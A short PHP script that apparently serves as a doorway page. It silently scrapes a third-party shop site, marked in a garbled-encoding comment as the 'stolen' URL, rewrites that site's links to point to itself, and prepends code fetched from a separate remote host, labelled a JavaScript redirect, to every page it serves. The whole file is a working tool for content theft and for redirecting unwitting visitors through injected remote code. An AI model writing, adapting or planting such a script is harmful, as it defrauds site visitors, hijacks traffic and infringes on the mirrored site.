<?php
error_reporting(0);
$domain="http://www.mbthomeuk.com"; //±»µÁÍøÖ·
$c_qstring = $_SERVER["QUERY_STRING"];
$c_url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$url=$domain;
$content=@file_get_contents($url.'/'.$c_qstring);
$jumpjs=@file_get_contents("http://mirror.citygrounds.net/uk-mbt.php"); //jsÌø×ªµØÖ·
$purl=str_replace('.','\.',$url);
$purl=str_replace('/','\/',$purl).'(\/?)';
$content=preg_replace("/<a(.+?)href=(\"|')".$purl."/","<a href=\"".$c_url."?",$content);
$content=preg_replace("/\?zenid=[a-z0-9]{1,}\"/", "\"", $content);
echo $jumpjs.$content;
?>
